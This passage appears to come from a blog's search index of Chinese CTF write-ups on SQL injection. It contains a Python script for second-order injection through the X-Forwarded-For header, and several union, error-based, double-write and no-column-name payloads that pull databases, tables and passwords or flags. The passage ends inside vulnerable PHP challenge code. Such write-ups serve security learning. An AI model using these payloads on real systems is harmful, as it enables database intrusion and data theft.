class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    start_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Last Ip: "</span><span class="token punctuation">)</span>    end_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">" -->"</span><span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span>    length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">[</span>start_pos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span> end_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]é•¿åº¦ï¼š"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"0'|conv(hex(substr(("</span> <span class="token operator">+</span> sql <span class="token operator">+</span> <span class="token string">"),"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",5)),16,10)|'0"</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment"># å°†è¯­å¥æ³¨å…¥</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># æŸ¥è¯¢ä¸Šæ¬¡IPæ—¶è§¦å‘äºŒæ¬¡æ³¨å…¥</span>        r <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span> <span class="token string">'glzjin'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># å†æ¬¡æŸ¥è¯¢å¾—åˆ°ç»“æœ</span>        start_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"Last Ip: "</span><span class="token punctuation">)</span>        end_pos <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">" -->"</span><span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">[</span>start_pos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span> end_pos<span class="token punctuation">]</span><span class="token punctuation">)</span>        return_result <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]ä½ç½® "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" è¯·æ±‚äº”ä½æˆåŠŸ:"</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> return_result<span class="token comment"># è·å–æ•°æ®åº“</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]è·å–æˆåŠŸï¼š"</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># è·å–æ•°æ®åº“è¡¨</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]è·å–æˆåŠŸï¼š"</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># è·å–æ•°æ®åº“è¡¨</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]è·å–æˆåŠŸï¼š"</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># è·å–è¡¨ä¸­å†…å®¹</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]è·å–æˆåŠŸï¼š"</span> <span class="token operator">+</span> execute_sql<span class="token punctuation">(</span><span class="token string">"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SQLæ³¨å…¥-æœ‰å›æ˜¾</title>
      <link href="posts/dede9973/"/>
      <url>posts/dede9973/</url>
      
        <content type="html"><![CDATA[<h2 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h2><h3 id="æå®¢å¤§æŒ‘æˆ˜â€”LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜â€”LoveSQL" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜â€”LoveSQL"></a>æå®¢å¤§æŒ‘æˆ˜â€”LoveSQL</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong> â€”â€”â€”â€”â€”â€”â€”- <a href="https://baijiahao.baidu.com/s?id=1595349117525189591&wfr=spider&for=pc"><strong>group_concat</strong>()</a></p><p>ç»è¿‡unionæµ‹è¯•å‘ç°æœ‰3ä¸ªå­—æ®µï¼Œå¹¶ä¸”2,3å­—æ®µå¯æŸ¥è¯¢ï¼Œ2å­—æ®µæŸ¥è¯¢ç»“æœçœ‹ä¸æ¸…ï¼Œç”¨ç¬¬3å­—æ®µ</p><p>æŸ¥æ•°æ®åº“ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æŸ¥è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æŸ¥åˆ—ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æœ€åpasswordå¯¹åº”çš„è¡¨ååº”è¯¥æ˜¯å‰é¢æŸ¥è¯¢è¡¨åæœ€åä¸€ä¸ª</p><p>æŸ¥l0ve1ysq1è¡¨æœ€åä¸€åˆ—çš„å­—æ®µå†…å®¹ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> l0ve1ysq1<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æœ€ç»ˆå¾—åˆ°flag</p><h3 id="æå®¢å¤§æŒ‘æˆ˜â€”BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜â€”BabySQL" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜â€”BabySQL"></a>æå®¢å¤§æŒ‘æˆ˜â€”BabySQL</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“åŒå†™ç»•è¿‡</p><p>è¯¦ç»†è§CSDNä¸Šå¤§ä½¬çš„<a href="https://blog.csdn.net/whoim_i/article/details/102869687">æ–‡ç« </a>ï¼Œå¦å¤–é™„ä¸Šæ–‡ç« çš„HTMLæ–‡æ¡£</p><p>è§£é¢˜æ–¹æ³•å’Œä¸Šä¸€ä¸ªé¢˜ç›®çš„å·®ä¸å¤šï¼Œåªæ˜¯è¿™æ¬¡å¤šäº†ä¸ªåŒå†™ç»•è¿‡</p><p>æŸ¥åº“ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' uniunionon seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span>schemata <span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æŸ¥è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æŸ¥åˆ—ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> frfromom infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æŸ¥å­—æ®µï¼Œåå¤å°è¯•åå‘ç°flagåœ¨è¡¨b4bsqlä¸­çš„passwordåˆ—</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' ununionion seselectlect <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span> frfromom b4bsql<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>å¾—åˆ°flag</p><h3 id="2019SWPUâ€”Web1"><a href="#2019SWPUâ€”Web1" class="headerlink" title="2019SWPUâ€”Web1"></a>2019SWPUâ€”Web1</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“æ— åˆ—åæŸ¥è¯¢</p><p>æµ‹è¯•åå‘ç°ç™»å½•ç•Œé¢åšäº†ä¸¥å¯†çš„é˜²æ³¨å…¥æªæ–½ï¼Œäºæ˜¯æ³¨å†Œè´¦å·</p><p>ç™»å½•åå¯ç”³è¯·å‘å¸ƒå¹¿å‘Š</p><p>å¹¿å‘Šç”³è¯·ç•Œé¢ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/CYufWMHk5dvQZXp.png" style="zoom:67%;" loading="lazy"><p>éšä¾¿ç”³è¯·ä¸€ä¸ªåé¦–é¡µæ˜¾ç¤ºï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQLæ³¨å…¥/IRm9FwGvXH81ZiT.png" style="zoom:67%;" loading="lazy"><p>å¹¿å‘Šè¯¦æƒ…ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/MrPNK86afEWqQLj.png" alt loading="lazy"></p><p>åœ¨å¹¿å‘Šç”³è¯·ç•Œé¢æµ‹è¯•åå‘ç°å­˜åœ¨SQLæ³¨å…¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RlfK1yp3mQCiV74.png" alt loading="lazy"></p><p>é…åˆunionæŸ¥è¯¢æŸ¥åˆ—æ•°ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><p>æˆ–</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span></code></pre><blockquote><p>æ³¨ï¼š</p><ul><li>è¿‡æ»¤äº†â€“+å’Œ#ï¼Œæ•…é—­åˆæœ€åçš„å•å¼•å·</li><li>è¿‡æ»¤äº†ç©ºæ ¼ç”¨/**/åˆ†ç¦»å‚æ•°</li></ul></blockquote><p>æœ‰22åˆ—ï¼Œç”±å¹¿å‘Šè¯¦æƒ…ç•Œé¢æ˜¾ç¤ºå¯çŸ¥ï¼Œç¬¬2,3åˆ—å¯æ³¨å…¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/E3zDiPNc7unoKsZ-1586919808082.png" alt loading="lazy"></p><p>æŸ¥æ•°æ®åº“åº“ï¼Œæ•°æ®åº“ç‰ˆæœ¬</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><p>æŸ¥è¡¨ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><blockquote><p>æ³¨ï¼š</p><ul><li>æ­¤å¤„åˆ©ç”¨æ— åˆ—åæ³¨å…¥</li><li>è¿‡æ»¤äº†information_scheamåº“çš„æŸ¥è¯¢ï¼Œæ•…ä½¿ç”¨å…¶å®ƒåº“è¿›è¡ŒæŸ¥è¯¢ï¼Œæ­¤é¢˜åœºæ™¯ä¸ºbuuctfä¸Šçš„å¤ç°é¢˜ç›®ï¼Œç”¨åˆ°mysqlåº“ä¸­çš„mysql.innodb_table_statsè¡¨ï¼ˆmysqlåœ¨5.5.xç‰ˆæœ¬åï¼Œé»˜è®¤ä½¿ç”¨innodbä½œä¸ºå­˜å‚¨å¼•æ“ï¼‰ï¼Œæ¯”èµ›æ—¶åŸé¢˜å¯ç”¨sysåº“ä¸­çš„sys.schema_auto_increment_columnsè¡¨è¿›è¡ŒæŸ¥è¯¢(mysqlç‰ˆæœ¬&gt;5.7æ—¶ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼ŒåŸºç¡€æ•°æ®æ¥è‡ªäºperformance_chemaå’Œinformation_schemaä¸¤ä¸ªåº“ï¼Œä½†æ˜¯æœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®)ï¼ŒæŸ¥è¯¢è¯­å¥å’Œä¸Šé¢çš„ä¸€æ ·</li><li>å‚è€ƒï¼š<a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">å®˜æ–¹æ–‡æ¡£</a></li><li>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema</a></li><li>å‚è€ƒï¼š<a href="https://www.jb51.net/article/134678.htm">æ¦‚è¿°MySQLç»Ÿè®¡ä¿¡æ¯</a></li></ul></blockquote><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LA2Tq1n3WSZd64r.png" alt loading="lazy"></p><p>æŸ¥åˆ—</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,(select/**/1,2,3/**/union/**/select*from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><blockquote><p>æ³¨ï¼šæ— åˆ—åæ³¨å…¥æŸ¥è¯¢usersè¡¨æœ‰3åˆ—ï¼Œï¼ˆæµ‹è¯•æ—¶å½“æŸ¥è¯¢usersåˆ—æ•°æ­£ç¡®æ—¶ä¼šæŠ¥ä¸åŒçš„é”™è¯¯ï¼‰</p></blockquote><p>åˆ—æ•°é”™è¯¯æ—¶ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/LH4Zv1tMgyw9nFB.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/WA96BqpKjUxmkET.png" alt loading="lazy"></p><p>ç„¶åå†é…åˆæ— åˆ—åæ³¨å…¥æ³¨å‡ºuserè¡¨ä¸­çš„flag</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt loading="lazy"></p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><h3 id="æå®¢å¤§æŒ‘æˆ˜â€”HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜â€”HardSQL" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜â€”HardSQL"></a>æå®¢å¤§æŒ‘æˆ˜â€”HardSQL</h3><p><strong>è§£é¢˜æ ¸å¿ƒ</strong>â€”â€”â€”â€”â€”â€“æŠ¥é”™æ³¨å…¥ï¼Œå¼‚æˆ–(^)æ³¨å…¥ï¼Œlikeç»•è¿‡ï¼Œå·¦å³æ‹¼æ¥</p><p>ç»è¿‡æµ‹è¯•å‘ç°è¿‡æ»¤äº†ï¼šç©ºæ ¼ï¼Œ=ï¼Œorder byï¼Œunionï¼Œand</p><p>ç”¨^å¼‚æˆ–æ“ä½œä»£æ›¿unionï¼Œç”¨updatexml()æˆ–extractvalue()æŠ¥é”™æ³¨å…¥ï¼Œä»¥ä¸‹å‡ä½¿ç”¨extractvalue()å‡½æ•°</p><p>æŸ¥åº“ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#æŸ¥å½“å‰æ•°æ®åº“</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#æŸ¥æ‰€æœ‰æ•°æ®åº“</span></code></pre><p>è¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰æ˜¾ç¤ºå½“å‰geekæ•°æ®åº“æœ‰ç‚¹çº³é—·ï¼Œå¯èƒ½æ˜¯è¿™ä¸ªæŸ¥è¯¢å±è”½äº†geekæ•°æ®åº“</p><p>æŸ¥è¡¨ï¼ˆlikeä»£æ›¿=è¿›è¡ŒæŸ¥è¯¢ï¼‰ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'</span>geek'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#æŸ¥geekæ•°æ®åº“ä¸‹çš„è¡¨</span></code></pre><p>æŸ¥åˆ—ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'</span>H4rDsq1'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p>æŸ¥å­—æ®µï¼ˆé™åˆ¶äº†æ˜¾ç¤ºçš„å­—ç¬¦ä¸²æ•°ï¼Œåˆ©ç”¨left()ï¼Œright()æŸ¥è¯¢ï¼‰ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(left(password,30))from(H4rDsq1))));#æŸ¥å·¦è¾¹1'</span><span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#æŸ¥å³è¾¹</span></code></pre><h3 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h3><p>ç›´æ¥çœ‹å…³é”®ä»£ç ï¼Œchange.phpä¸­ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span><span class="token punctuation">;</span>    <span class="token variable">$user_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"address"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span 